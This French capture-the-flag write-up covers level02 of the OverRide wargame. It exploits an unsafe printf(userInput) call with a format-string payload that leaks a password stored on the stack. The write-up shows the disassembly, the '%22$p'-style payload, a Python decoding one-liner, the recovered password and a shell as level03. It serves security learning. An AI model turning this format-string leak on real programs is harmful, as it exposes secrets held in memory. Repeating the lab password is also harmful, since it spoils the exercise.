### level02

Dans cet exercice, le programme va lire le fichier .pass que l'on cherche justement à lire.
Ensuite il va demander à l'utilisateur de rentrer un username ainsi qu'un password.
Si le password est le même, il va lancer un bash avec les droits de l'utilisateur supérieur.
Cela signifie que pour lancer un bash et lire le contenu du .pass il faut déjà connaître son contenu, ironique n'est-ce pas ?
On va donc obtenir le password autrement, ça tombe bien il est lu par le programme dans le fichier .pass et se trouve donc sur la stack.
On va exploiter un printf non sécurisé :

```c
  if (strncmp(passwordFromFile, userPassword, 41) != 0) {
    printf(userInput);                                      <===
    puts(" does not have access!\n");
    exit(1);
  }
```
On peut donc exploiter la variable userInput pour lire des valeurs sur la stack, il ne reste plus qu'à trouver sa place dans la stack.

Dans l'assembleur on retrouve :

```assembly
  4008e6:	48 8d 85 60 ff ff ff 	lea    rax,[rbp-0xa0]           <===
  4008ed:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  4008f1:	48 89 d1             	mov    rcx,rdx
  4008f4:	ba 29 00 00 00       	mov    edx,0x29
  4008f9:	be 01 00 00 00       	mov    esi,0x1
  4008fe:	48 89 c7             	mov    rdi,rax
  400901:	e8 8a fd ff ff       	call   400690 <fread@plt>
```
Notre variable se trouve en rbp-0xa0, a0 = 160 en décimal donc notre argument est le 160/8 + 2 = 22, de plus le mdp fait 40 caractères donc on a 40/8 = 5 arguments.
On affiche les arguments 22 à 26 de la stack :

```bash
level02@OverRide:~$ python -c 'print "%22$p%23$p%24$p%25$p%26$p"' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
```

Maintenant il nous reste à récuperer les adresses et à décoder leurs valeurs en hexa, nous avons fait un script python inline pour cela :

```bash
python -c 'print "%22$p%23$p%24$p%25$p%26$p"' | ./level02 | awk 'END {print $1}' | python -c "import sys; print(''.join([value.decode('hex')[::-1] for value in sys.stdin.read().strip().split('0x')]))"
```

Il ne reste plus qu'à tester le mdp sur le programme pour confirmer qu'il est bon :

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: user
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, user!
$ whoami
level03
```